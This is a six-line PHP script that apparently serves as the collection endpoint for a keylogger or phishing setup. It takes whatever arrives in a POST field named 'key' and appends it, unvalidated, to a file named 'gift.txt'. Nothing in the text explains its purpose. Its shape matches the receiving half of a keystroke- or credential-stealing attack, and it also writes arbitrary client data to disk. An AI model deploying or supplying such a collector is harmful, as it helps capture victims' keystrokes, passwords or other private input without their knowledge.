<?php
$key=$_POST['key'];
$logfile="gift.txt";
$fp = fopen($logfile, "a");
fwrite($fp, $key);
fclose($fp); 
?>